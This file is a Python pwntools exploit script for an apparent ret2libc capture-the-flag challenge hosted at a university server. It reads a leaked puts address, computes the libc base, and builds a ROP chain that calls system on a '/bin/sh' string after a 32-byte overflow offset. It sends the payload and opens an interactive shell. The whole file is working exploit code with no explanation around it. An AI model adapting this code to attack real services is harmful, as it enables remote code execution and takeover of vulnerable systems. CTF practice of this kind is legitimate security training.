#!/bin/usr/python3
from pwn import *

context.terminal = ["tmux", "split", "-h"]
elf = context.binary = ELF("./ret2libc")
context.delete_corefiles = True
context.log_level = "info"
libc = ELF("./libc.so.6")

def start():
	p = process("./ret2libc")
	gdb.attach(p, gdbscript = """
		b 0x804854e
		continue
	""")
	return p

#libc_puts = 0x00064da0
libc_puts_offset = libc.symbols.puts
binsh_addr = 0x804a02c
offset = 32

#p = process("./ret2libc")
#p = start()
p = remote("bamboofox.cs.nctu.edu.tw", 11002)

p.recvuntil('The address of function "puts" is 0x')
puts_addr = p.recv()
puts_addr = int(puts_addr, 16)
info("puts addr = %#x", puts_addr)

libc.address = puts_addr - libc_puts_offset
rop = ROP(elf)
rop.call(libc.symbols.system, [binsh_addr])
payload = flat({
	offset: rop.chain()
})

f = open("./payload", "wb")
f.write(payload)
f.close()

p.sendline(payload)
p.interactive()

